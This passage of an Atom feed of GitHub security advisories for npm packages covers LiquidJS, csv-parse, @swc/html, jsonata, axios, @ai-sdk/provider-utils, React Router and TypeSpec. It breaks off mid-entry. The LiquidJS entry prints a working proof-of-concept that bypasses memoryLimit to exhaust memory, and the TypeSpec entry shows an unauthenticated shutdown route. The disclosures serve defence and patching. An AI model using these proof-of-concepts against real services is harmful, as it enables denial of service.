<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-09-08T19:06:43.575Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[liquidjs] LiquidJS: Uncontrolled Resource Consumption in `join` filter allows template authors to bypass `memoryLimit` and crash the process]]></title>
        <id>https://github.com/advisories/GHSA-4r6h-5v86-94p3</id>
        <link href="https://github.com/advisories/GHSA-4r6h-5v86-94p3"/>
        <updated>2026-09-08T18:10:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>join</code> filter (<code>src/filters/array.ts:8-13</code>) charges <code>memoryLimit</code> by array element <strong>count</strong>, not by the string length it produces, letting a template bypass a configured <code>memoryLimit</code> and allocate strings far past budget — bounded only by V8/process limits, not by <code>memoryLimit</code>.</p>
<h3 id="details">Details</h3>
<pre><code class="language-js">// src/filters/array.ts:8-13
export const join = argumentsToValue(function (this: FilterImpl, v: any[], arg: string) {
  const array = toArray(v)
  const sep = isNil(arg) ? ' ' : stringify(arg)
  const complexity = array.length * (1 + sep.length)   // element COUNT, not element sizes
  this.context.memoryLimit.use(complexity)
  return array.join(sep)                                // allocates sum(element lengths) + separators
})
</code></pre>
<p><code>concat</code> (<code>array.ts:72</code>) is the enabler: it charges by element count too, but only copies references (cheap for both limiter and heap), so an array's element count can be doubled repeatedly at near-zero real cost. <code>join</code> is where the bug lives — it's the call that actually materializes all referenced content into one string, and its own charge (<code>array.length</code>) doesn't reflect that.</p>
<p>Same undercounting class as already-fixed <code>replace</code> (GHSA-mmg9-6m6j-jqqx), <code>replace_first</code> (GHSA-6q5m-63h6-5x4v), <code>date</code>/strftime (GHSA-hh27-hf48-9f5q) — <code>join</code> wasn't covered. Sibling <code>array_to_sentence_string</code> (<code>src/filters/string.ts:210</code>) has the identical defect.</p>
<h3 id="poc">PoC</h3>
<p>Live-reproduced against <code>liquidjs@10.27.1</code>, Node v24.3.0.</p>
<pre><code class="language-javascript">const { Liquid } = require('liquidjs');
const engine = new Liquid({ memoryLimit: 1e7 }); // 10M-unit DoS defense

const E = 5000, DOUBLINGS = 13;
const chunk = 'a'.repeat(E);
let tpl = `{%- assign s = "${chunk}" -%}{%- assign a = s | split: "NOSUCHSEP" -%}`;
for (let i = 0; i &lt; DOUBLINGS; i++) tpl += `{%- assign a = a | concat: a -%}`; // 1 -&gt; 8192 elements
tpl += `{%- assign out = a | join: "" -%}{{ out | size }}`;

const len = Number(engine.renderSync(engine.parse(tpl))); // succeeds — should be blocked
console.log('output length:', len);  // output length: 40960000
</code></pre>
<p>Verified by binary-search on <code>memoryLimit</code>: render is <strong>blocked at 29573</strong>, <strong>succeeds at 29574</strong> — confirming total charge across <code>split</code>+13×<code>concat</code>+<code>join</code> is exactly 29,574 units (split 5000, concat 16382, join 8192). Output length: <strong>40,960,000</strong> — <strong>1385x</strong> the total charged, &gt;4x the configured 10,000,000-unit limit. Scaling <code>DOUBLINGS</code> grows output exponentially for linear charge growth, driving toward gigabytes and a <code>RangeError: Invalid string length</code> / V8 OOM crash.</p>
<h3 id="impact">Impact</h3>
<p>Any app rendering attacker-influenced templates with <code>memoryLimit</code> set (LiquidJS docs list it as covering "array concat/join/strftime") can have that control bypassed by one short template, forcing allocation well past budget up to a process crash. <code>split</code>/<code>concat</code> are correctly charged; the gap is <code>join</code>'s own accounting of its own output. (LiquidJS's security-model docs call these limits "cooperative safeguards, not strict isolation" — doesn't change that <code>join</code>'s charge is wrong relative to what it allocates.)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/harttle/liquidjs/security/advisories/GHSA-4r6h-5v86-94p3">https://github.com/harttle/liquidjs/security/advisories/GHSA-4r6h-5v86-94p3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-69222">https://nvd.nist.gov/vuln/detail/CVE-2026-69222</a></li>
<li><a href="https://github.com/harttle/liquidjs/pull/925">https://github.com/harttle/liquidjs/pull/925</a></li>
<li><a href="https://github.com/harttle/liquidjs/commit/7ab49f999ac045ec1e87f3a7a9fd68dd9e8602b3">https://github.com/harttle/liquidjs/commit/7ab49f999ac045ec1e87f3a7a9fd68dd9e8602b3</a></li>
<li><a href="https://github.com/harttle/liquidjs/releases/tag/v10.27.2">https://github.com/harttle/liquidjs/releases/tag/v10.27.2</a></li>
<li><a href="https://github.com/advisories/GHSA-4r6h-5v86-94p3">https://github.com/advisories/GHSA-4r6h-5v86-94p3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4r6h-5v86-94p3</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-08T18:10:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[csv-parse] node-csv: Prototype replacement still reachable via columns path]]></title>
        <id>https://github.com/advisories/GHSA-8cw4-87c7-c6xx</id>
        <link href="https://github.com/advisories/GHSA-8cw4-87c7-c6xx"/>
        <updated>2026-09-08T18:01:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>With columns: true and group_columns_by_name: true, a duplicated <strong>proto</strong>  header causes the duplicate-column branch to assign an array to obj['<strong>proto</strong>'], invoking the <strong>proto</strong> setter and replacing the parsed record object's prototype with attacker-controlled data. Fixed in 7.0.2 (Object.hasOwn duplicate check + Object.defineProperty assignment).</p>
<h3 id="patches">Patches</h3>
<p>The problem been patched.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Disable usage of both the columns and  group_columns_by_name options.</p>
<h3 id="references">References</h3>
<p>issue #496, PR #497</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/adaltas/node-csv/security/advisories/GHSA-8cw4-87c7-c6xx">https://github.com/adaltas/node-csv/security/advisories/GHSA-8cw4-87c7-c6xx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-85063">https://nvd.nist.gov/vuln/detail/CVE-2026-85063</a></li>
<li><a href="https://github.com/adaltas/node-csv/issues/496">https://github.com/adaltas/node-csv/issues/496</a></li>
<li><a href="https://github.com/adaltas/node-csv/pull/497">https://github.com/adaltas/node-csv/pull/497</a></li>
<li><a href="https://github.com/adaltas/node-csv/commit/eb4d1484589c976dcb977db8dd0b90e015a6f66e">https://github.com/adaltas/node-csv/commit/eb4d1484589c976dcb977db8dd0b90e015a6f66e</a></li>
<li><a href="https://github.com/advisories/GHSA-8cw4-87c7-c6xx">https://github.com/advisories/GHSA-8cw4-87c7-c6xx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8cw4-87c7-c6xx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-08T18:01:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@swc/html] SWC HTML minifier may allow script element breakout when minifying embedded JSON]]></title>
        <id>https://github.com/advisories/GHSA-5qr2-v392-m9g8</id>
        <link href="https://github.com/advisories/GHSA-5qr2-v392-m9g8"/>
        <updated>2026-09-08T17:58:02.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p><code>@swc/html</code> minifies JSON contained in <code>script</code> elements such as
<code>application/json</code> and <code>application/ld+json</code> by parsing and serializing the
JSON value.</p>
<p>Before the patched versions, JSON serialization could convert escaped
less-than signs such as <code>\u003C</code> into literal <code>&lt;</code> characters. If the JSON
contained an escaped <code>&lt;/script&gt;</code> sequence, the generated HTML could terminate
the containing script element early because HTML tokenization occurs before
the JSON is consumed.</p>
<p>Applications that minify HTML containing attacker-controlled JSON data could
therefore transform inert data into active markup. A crafted payload could
execute script in the origin of the generated page.</p>
<h2 id="patches">Patches</h2>
<p>The issue is fixed in:</p>
<ul>
<li><code>@swc/html</code> 1.15.47</li>
<li><code>swc_html_minifier</code> 59.0.0</li>
</ul>
<p>The minifier now re-escapes less-than signs after JSON serialization, preserving
the script element boundary.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Users who cannot upgrade can disable JSON minification with:</p>
<pre><code class="language-js">await minify(html, {
  minifyJson: false,
});
### References

- &lt;https://github.com/swc-project/swc/security/advisories/GHSA-5qr2-v392-m9g8&gt;
- &lt;https://nvd.nist.gov/vuln/detail/CVE-2026-72925&gt;
- &lt;https://github.com/swc-project/swc/pull/12080&gt;
- &lt;https://github.com/swc-project/swc/commit/e1877b44bdac8abc9fd51e984d584f40f6999832&gt;
- &lt;https://github.com/swc-project/swc/releases/tag/v1.15.47&gt;
- &lt;https://github.com/swc-project/swc/releases/tag/v1.15.47-nightly-20260729.1&gt;
- &lt;https://github.com/advisories/GHSA-5qr2-v392-m9g8&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5qr2-v392-m9g8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-08T17:58:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsonata] jsonata: Function Binding Prototype Pollution via hasOwnProperty Override]]></title>
        <id>https://github.com/advisories/GHSA-663r-x48j-fg8p</id>
        <link href="https://github.com/advisories/GHSA-663r-x48j-fg8p"/>
        <updated>2026-09-08T17:36:21.000Z</updated>
        <content type="html"><![CDATA[<p>A weakness has been identified in jsonata-js jsonata up to 2.2.0. The affected element is the function createFrame of the file src/jsonata.js of the component Function Binding Frame System. This manipulation causes improperly controlled modification of object prototype attributes. It is possible to initiate the attack remotely. The exploit has been made available to the public and could be used for attacks. The vendor was contacted early about this disclosure but did not respond in any way.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12208">https://nvd.nist.gov/vuln/detail/CVE-2026-12208</a></li>
<li><a href="https://github.com/OriginSecurityX/jsonata-hasownproperty-bypass">https://github.com/OriginSecurityX/jsonata-hasownproperty-bypass</a></li>
<li><a href="https://vuldb.com/cve/CVE-2026-12208">https://vuldb.com/cve/CVE-2026-12208</a></li>
<li><a href="https://vuldb.com/submit/832446">https://vuldb.com/submit/832446</a></li>
<li><a href="https://vuldb.com/vuln/370850">https://vuldb.com/vuln/370850</a></li>
<li><a href="https://vuldb.com/vuln/370850/cti">https://vuldb.com/vuln/370850/cti</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/799">https://github.com/jsonata-js/jsonata/pull/799</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/806">https://github.com/jsonata-js/jsonata/pull/806</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/59e25144fc3b7125f6befd71b8a6e14e1fa610d2">https://github.com/jsonata-js/jsonata/commit/59e25144fc3b7125f6befd71b8a6e14e1fa610d2</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/f09df8416eab8ff44926fc6527c80fb8701de159">https://github.com/jsonata-js/jsonata/commit/f09df8416eab8ff44926fc6527c80fb8701de159</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/releases/tag/v1.8.8">https://github.com/jsonata-js/jsonata/releases/tag/v1.8.8</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/releases/tag/v2.2.1">https://github.com/jsonata-js/jsonata/releases/tag/v2.2.1</a></li>
<li><a href="https://github.com/advisories/GHSA-663r-x48j-fg8p">https://github.com/advisories/GHSA-663r-x48j-fg8p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-663r-x48j-fg8p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-15T03:30:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsonata] jsonata: Function Binding Prototype Pollution via hasOwnProperty Override]]></title>
        <id>https://github.com/advisories/GHSA-663r-x48j-fg8p</id>
        <link href="https://github.com/advisories/GHSA-663r-x48j-fg8p"/>
        <updated>2026-09-08T17:36:21.000Z</updated>
        <content type="html"><![CDATA[<p>A weakness has been identified in jsonata-js jsonata up to 2.2.0. The affected element is the function createFrame of the file src/jsonata.js of the component Function Binding Frame System. This manipulation causes improperly controlled modification of object prototype attributes. It is possible to initiate the attack remotely. The exploit has been made available to the public and could be used for attacks. The vendor was contacted early about this disclosure but did not respond in any way.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12208">https://nvd.nist.gov/vuln/detail/CVE-2026-12208</a></li>
<li><a href="https://github.com/OriginSecurityX/jsonata-hasownproperty-bypass">https://github.com/OriginSecurityX/jsonata-hasownproperty-bypass</a></li>
<li><a href="https://vuldb.com/cve/CVE-2026-12208">https://vuldb.com/cve/CVE-2026-12208</a></li>
<li><a href="https://vuldb.com/submit/832446">https://vuldb.com/submit/832446</a></li>
<li><a href="https://vuldb.com/vuln/370850">https://vuldb.com/vuln/370850</a></li>
<li><a href="https://vuldb.com/vuln/370850/cti">https://vuldb.com/vuln/370850/cti</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/799">https://github.com/jsonata-js/jsonata/pull/799</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/pull/806">https://github.com/jsonata-js/jsonata/pull/806</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/59e25144fc3b7125f6befd71b8a6e14e1fa610d2">https://github.com/jsonata-js/jsonata/commit/59e25144fc3b7125f6befd71b8a6e14e1fa610d2</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/commit/f09df8416eab8ff44926fc6527c80fb8701de159">https://github.com/jsonata-js/jsonata/commit/f09df8416eab8ff44926fc6527c80fb8701de159</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/releases/tag/v1.8.8">https://github.com/jsonata-js/jsonata/releases/tag/v1.8.8</a></li>
<li><a href="https://github.com/jsonata-js/jsonata/releases/tag/v2.2.1">https://github.com/jsonata-js/jsonata/releases/tag/v2.2.1</a></li>
<li><a href="https://github.com/advisories/GHSA-663r-x48j-fg8p">https://github.com/advisories/GHSA-663r-x48j-fg8p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-663r-x48j-fg8p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-15T03:30:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Duplicate Advisory: Axios form serializer maxDepth bypass via {} metatoken]]></title>
        <id>https://github.com/advisories/GHSA-3mcp-22mf-vrw3</id>
        <link href="https://github.com/advisories/GHSA-3mcp-22mf-vrw3"/>
        <updated>2026-09-08T17:16:46.000Z</updated>
        <content type="html"><![CDATA[<h2 id="duplicate-advisory">Duplicate Advisory</h2>
<p>This advisory has been withdrawn because it is a duplicate of&nbsp;GHSA-hcpx-6fm6-wx23. This link is maintained to preserve external references.</p>
<h2 id="original-description">Original Description</h2>
<p>axios before 0.33.0 contains an incomplete depth-limit bypass in toFormData.js when serializing objects with top-level keys ending in '{}'. Attackers who control object keys and nested values passed to axios form or parameter serialization can trigger a RangeError from JSON.stringify, causing denial of service in the affected request path.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-hcpx-6fm6-wx23">https://github.com/axios/axios/security/advisories/GHSA-hcpx-6fm6-wx23</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-67321">https://nvd.nist.gov/vuln/detail/CVE-2026-67321</a></li>
<li><a href="https://www.vulncheck.com/advisories/axios-before-denial-of-service-via-maxdepth-bypass">https://www.vulncheck.com/advisories/axios-before-denial-of-service-via-maxdepth-bypass</a></li>
<li><a href="https://github.com/advisories/GHSA-3mcp-22mf-vrw3">https://github.com/advisories/GHSA-3mcp-22mf-vrw3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3mcp-22mf-vrw3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-01T15:30:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@ai-sdk/provider-utils] @ai-sdk/provider-utils has an Uncontrolled Resource Consumption issue]]></title>
        <id>https://github.com/advisories/GHSA-866g-f22w-33x8</id>
        <link href="https://github.com/advisories/GHSA-866g-f22w-33x8"/>
        <updated>2026-09-08T16:16:51.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of <code>@ai-sdk/provider-utils</code> before 3.0.28, from 4.0.0 before 4.0.33, and from 5.0.0 before 5.0.1 are vulnerable to uncontrolled resource consumption. The <code>createJsonResponseHandler</code>, <code>createJsonErrorResponseHandler</code>, and <code>createStatusCodeErrorResponseHandler</code> functions in <code>packages/provider-utils/src/response-handler.ts</code> read response bodies without a shared size limit, allowing a remote attacker with low privileges to cause excessive memory consumption. The exploit has been publicly disclosed and may be utilized.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-8769">https://nvd.nist.gov/vuln/detail/CVE-2026-8769</a></li>
<li><a href="https://gist.github.com/YLChen-007/fb1096bc8428bed9a428f764d9d103bb">https://gist.github.com/YLChen-007/fb1096bc8428bed9a428f764d9d103bb</a></li>
<li><a href="https://vuldb.com/submit/811406">https://vuldb.com/submit/811406</a></li>
<li><a href="https://vuldb.com/vuln/364394">https://vuldb.com/vuln/364394</a></li>
<li><a href="https://vuldb.com/vuln/364394/cti">https://vuldb.com/vuln/364394/cti</a></li>
<li><a href="https://github.com/vercel/ai/pull/16374">https://github.com/vercel/ai/pull/16374</a></li>
<li><a href="https://github.com/vercel/ai/commit/6a436e31d247d678ddaedfc6f61e73ac0595e4b4">https://github.com/vercel/ai/commit/6a436e31d247d678ddaedfc6f61e73ac0595e4b4</a></li>
<li><a href="https://github.com/vercel/ai/commit/b30e43ac3fae2432a40b4f4f27f844f3d78b119e">https://github.com/vercel/ai/commit/b30e43ac3fae2432a40b4f4f27f844f3d78b119e</a></li>
<li><a href="https://github.com/vercel/ai/commit/b85c4fbc603b8173cf50a9790823397aada908a9">https://github.com/vercel/ai/commit/b85c4fbc603b8173cf50a9790823397aada908a9</a></li>
<li><a href="https://github.com/vercel/ai/blob/main/packages/provider-utils/CHANGELOG.md#501">https://github.com/vercel/ai/blob/main/packages/provider-utils/CHANGELOG.md#501</a></li>
<li><a href="https://github.com/vercel/ai/releases/tag/@ai-sdk/provider-utils@3.0.28">https://github.com/vercel/ai/releases/tag/@ai-sdk/provider-utils@3.0.28</a></li>
<li><a href="https://github.com/vercel/ai/releases/tag/@ai-sdk/provider-utils@4.0.33">https://github.com/vercel/ai/releases/tag/@ai-sdk/provider-utils@4.0.33</a></li>
<li><a href="https://github.com/vercel/ai/releases/tag/@ai-sdk/provider-utils@5.0.1">https://github.com/vercel/ai/releases/tag/@ai-sdk/provider-utils@5.0.1</a></li>
<li><a href="https://github.com/advisories/GHSA-866g-f22w-33x8">https://github.com/advisories/GHSA-866g-f22w-33x8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-866g-f22w-33x8</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-18T00:31:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@ai-sdk/provider-utils] @ai-sdk/provider-utils has an Uncontrolled Resource Consumption issue]]></title>
        <id>https://github.com/advisories/GHSA-866g-f22w-33x8</id>
        <link href="https://github.com/advisories/GHSA-866g-f22w-33x8"/>
        <updated>2026-09-08T16:16:51.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of <code>@ai-sdk/provider-utils</code> before 3.0.28, from 4.0.0 before 4.0.33, and from 5.0.0 before 5.0.1 are vulnerable to uncontrolled resource consumption. The <code>createJsonResponseHandler</code>, <code>createJsonErrorResponseHandler</code>, and <code>createStatusCodeErrorResponseHandler</code> functions in <code>packages/provider-utils/src/response-handler.ts</code> read response bodies without a shared size limit, allowing a remote attacker with low privileges to cause excessive memory consumption. The exploit has been publicly disclosed and may be utilized.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-8769">https://nvd.nist.gov/vuln/detail/CVE-2026-8769</a></li>
<li><a href="https://gist.github.com/YLChen-007/fb1096bc8428bed9a428f764d9d103bb">https://gist.github.com/YLChen-007/fb1096bc8428bed9a428f764d9d103bb</a></li>
<li><a href="https://vuldb.com/submit/811406">https://vuldb.com/submit/811406</a></li>
<li><a href="https://vuldb.com/vuln/364394">https://vuldb.com/vuln/364394</a></li>
<li><a href="https://vuldb.com/vuln/364394/cti">https://vuldb.com/vuln/364394/cti</a></li>
<li><a href="https://github.com/vercel/ai/pull/16374">https://github.com/vercel/ai/pull/16374</a></li>
<li><a href="https://github.com/vercel/ai/commit/6a436e31d247d678ddaedfc6f61e73ac0595e4b4">https://github.com/vercel/ai/commit/6a436e31d247d678ddaedfc6f61e73ac0595e4b4</a></li>
<li><a href="https://github.com/vercel/ai/commit/b30e43ac3fae2432a40b4f4f27f844f3d78b119e">https://github.com/vercel/ai/commit/b30e43ac3fae2432a40b4f4f27f844f3d78b119e</a></li>
<li><a href="https://github.com/vercel/ai/commit/b85c4fbc603b8173cf50a9790823397aada908a9">https://github.com/vercel/ai/commit/b85c4fbc603b8173cf50a9790823397aada908a9</a></li>
<li><a href="https://github.com/vercel/ai/blob/main/packages/provider-utils/CHANGELOG.md#501">https://github.com/vercel/ai/blob/main/packages/provider-utils/CHANGELOG.md#501</a></li>
<li><a href="https://github.com/vercel/ai/releases/tag/@ai-sdk/provider-utils@3.0.28">https://github.com/vercel/ai/releases/tag/@ai-sdk/provider-utils@3.0.28</a></li>
<li><a href="https://github.com/vercel/ai/releases/tag/@ai-sdk/provider-utils@4.0.33">https://github.com/vercel/ai/releases/tag/@ai-sdk/provider-utils@4.0.33</a></li>
<li><a href="https://github.com/vercel/ai/releases/tag/@ai-sdk/provider-utils@5.0.1">https://github.com/vercel/ai/releases/tag/@ai-sdk/provider-utils@5.0.1</a></li>
<li><a href="https://github.com/advisories/GHSA-866g-f22w-33x8">https://github.com/advisories/GHSA-866g-f22w-33x8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-866g-f22w-33x8</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-18T00:31:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@ai-sdk/provider-utils] @ai-sdk/provider-utils has an Uncontrolled Resource Consumption issue]]></title>
        <id>https://github.com/advisories/GHSA-866g-f22w-33x8</id>
        <link href="https://github.com/advisories/GHSA-866g-f22w-33x8"/>
        <updated>2026-09-08T16:16:51.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of <code>@ai-sdk/provider-utils</code> before 3.0.28, from 4.0.0 before 4.0.33, and from 5.0.0 before 5.0.1 are vulnerable to uncontrolled resource consumption. The <code>createJsonResponseHandler</code>, <code>createJsonErrorResponseHandler</code>, and <code>createStatusCodeErrorResponseHandler</code> functions in <code>packages/provider-utils/src/response-handler.ts</code> read response bodies without a shared size limit, allowing a remote attacker with low privileges to cause excessive memory consumption. The exploit has been publicly disclosed and may be utilized.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-8769">https://nvd.nist.gov/vuln/detail/CVE-2026-8769</a></li>
<li><a href="https://gist.github.com/YLChen-007/fb1096bc8428bed9a428f764d9d103bb">https://gist.github.com/YLChen-007/fb1096bc8428bed9a428f764d9d103bb</a></li>
<li><a href="https://vuldb.com/submit/811406">https://vuldb.com/submit/811406</a></li>
<li><a href="https://vuldb.com/vuln/364394">https://vuldb.com/vuln/364394</a></li>
<li><a href="https://vuldb.com/vuln/364394/cti">https://vuldb.com/vuln/364394/cti</a></li>
<li><a href="https://github.com/vercel/ai/pull/16374">https://github.com/vercel/ai/pull/16374</a></li>
<li><a href="https://github.com/vercel/ai/commit/6a436e31d247d678ddaedfc6f61e73ac0595e4b4">https://github.com/vercel/ai/commit/6a436e31d247d678ddaedfc6f61e73ac0595e4b4</a></li>
<li><a href="https://github.com/vercel/ai/commit/b30e43ac3fae2432a40b4f4f27f844f3d78b119e">https://github.com/vercel/ai/commit/b30e43ac3fae2432a40b4f4f27f844f3d78b119e</a></li>
<li><a href="https://github.com/vercel/ai/commit/b85c4fbc603b8173cf50a9790823397aada908a9">https://github.com/vercel/ai/commit/b85c4fbc603b8173cf50a9790823397aada908a9</a></li>
<li><a href="https://github.com/vercel/ai/blob/main/packages/provider-utils/CHANGELOG.md#501">https://github.com/vercel/ai/blob/main/packages/provider-utils/CHANGELOG.md#501</a></li>
<li><a href="https://github.com/vercel/ai/releases/tag/@ai-sdk/provider-utils@3.0.28">https://github.com/vercel/ai/releases/tag/@ai-sdk/provider-utils@3.0.28</a></li>
<li><a href="https://github.com/vercel/ai/releases/tag/@ai-sdk/provider-utils@4.0.33">https://github.com/vercel/ai/releases/tag/@ai-sdk/provider-utils@4.0.33</a></li>
<li><a href="https://github.com/vercel/ai/releases/tag/@ai-sdk/provider-utils@5.0.1">https://github.com/vercel/ai/releases/tag/@ai-sdk/provider-utils@5.0.1</a></li>
<li><a href="https://github.com/advisories/GHSA-866g-f22w-33x8">https://github.com/advisories/GHSA-866g-f22w-33x8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-866g-f22w-33x8</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-18T00:31:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[react-router-dom] React Router: Open redirect leading to XSS]]></title>
        <id>https://github.com/advisories/GHSA-jjmj-jmhj-qwj2</id>
        <link href="https://github.com/advisories/GHSA-jjmj-jmhj-qwj2"/>
        <updated>2026-09-08T15:09:29.000Z</updated>
        <content type="html"><![CDATA[<p>Applications with open redirects could permit attacker crafted links to result in redirects to unexpected external location or XSS vectors.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/remix-run/react-router/security/advisories/GHSA-jjmj-jmhj-qwj2">https://github.com/remix-run/react-router/security/advisories/GHSA-jjmj-jmhj-qwj2</a></li>
<li><a href="https://github.com/remix-run/react-router/pull/14718">https://github.com/remix-run/react-router/pull/14718</a></li>
<li><a href="https://github.com/remix-run/react-router/commit/3a5b5ad0e5cf9918c646509563f5c41a89226ff3">https://github.com/remix-run/react-router/commit/3a5b5ad0e5cf9918c646509563f5c41a89226ff3</a></li>
<li><a href="https://github.com/remix-run/react-router/blob/main/CHANGELOG.md#v7180">https://github.com/remix-run/react-router/blob/main/CHANGELOG.md#v7180</a></li>
<li><a href="https://github.com/remix-run/react-router/releases/tag/react-router@7.18.0">https://github.com/remix-run/react-router/releases/tag/react-router@7.18.0</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53668">https://nvd.nist.gov/vuln/detail/CVE-2026-53668</a></li>
<li><a href="https://github.com/remix-run/react-router/blob/v6/CHANGELOG.md#v6306">https://github.com/remix-run/react-router/blob/v6/CHANGELOG.md#v6306</a></li>
<li><a href="https://github.com/remix-run/react-router/releases/tag/react-router@6.30.6">https://github.com/remix-run/react-router/releases/tag/react-router@6.30.6</a></li>
<li><a href="https://github.com/advisories/GHSA-jjmj-jmhj-qwj2">https://github.com/advisories/GHSA-jjmj-jmhj-qwj2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jjmj-jmhj-qwj2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-23T19:36:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@typespec/spector] TypeSpec: Unauthenticated Remote Shutdown of Spector Mock Server via POST /.admin/stop]]></title>
        <id>https://github.com/advisories/GHSA-7q9c-hpx7-9cwm</id>
        <link href="https://github.com/advisories/GHSA-7q9c-hpx7-9cwm"/>
        <updated>2026-09-04T21:43:16.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>@typespec/spector</code> registers a <code>POST /.admin/stop</code> HTTP route with no authentication, authorization token, Origin check, or IP-source restriction. Any network-reachable client can send a single unauthenticated POST request to terminate the mock server process. Because the server binds to <code>0.0.0.0</code> by default (all interfaces), this endpoint is exposed to any host that can reach the server's port—not just localhost—making a complete denial-of-service trivially achievable with one HTTP request. Severity is <strong>High (CVSS 7.5)</strong>.</p>
<h3 id="details">Details</h3>
<p>The vulnerability originates in <code>packages/spector/src/routes/admin.ts</code> at line 7, where an Express router registers the shutdown endpoint with no authentication middleware whatsoever:</p>
<pre><code class="language-ts">// packages/spector/src/routes/admin.ts:7-12
router.post(AdminUrls.stop, (_req, res) =&gt; {
  logger.info("Received signal to stop server. Exiting...");
  res.status(202).end();
  setTimeout(() =&gt; {
    process.exit(0);
  });
});
</code></pre>
<p>The constant <code>AdminUrls.stop</code> resolves to <code>/.admin/stop</code> (<code>packages/spector/src/constants.ts:1-3</code>).</p>
